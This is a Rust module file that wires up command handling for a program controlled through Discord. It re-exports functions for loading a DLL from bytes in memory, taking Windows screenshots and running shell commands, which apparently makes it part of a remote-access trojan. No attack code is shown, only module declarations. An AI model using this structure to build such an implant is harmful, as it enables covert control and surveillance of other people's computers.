//! Command processing module
//!
//! Handles parsing and dispatching of commands received from Discord.

mod loaddll;
mod models;
#[cfg(windows)]
mod screenshot;
mod shell;

pub use loaddll::load_dll_from_bytes;
pub use models::{get_help_message, Command, CommandResult};
#[cfg(windows)]
pub use screenshot::capture_screenshot;
pub use shell::execute_shell_command;
